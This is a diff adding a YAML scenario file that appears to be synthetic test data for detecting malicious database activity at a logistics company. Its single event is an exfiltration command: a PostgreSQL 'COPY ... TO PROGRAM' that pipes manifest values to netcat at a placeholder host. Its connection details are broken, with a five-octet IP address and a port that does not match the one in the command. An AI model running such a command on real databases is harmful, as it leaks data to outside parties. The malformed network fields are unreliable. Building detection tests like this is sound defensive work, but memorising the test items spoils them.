@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_32_copy_to_program_mal_801m
+family_id: gen_logistics_32_copy_to_program_fam_801
+domain: logistics
+time_of_day: 00:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT declared_value FROM manifests) TO PROGRAM 'nc analytics-mirror.datasink.example
+      443'
+    connects_to:
+      ip: 176.65.48.22.25
+      port: 9443
+matched_pair_id: gen_logistics_32_copy_to_program_pair_801
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
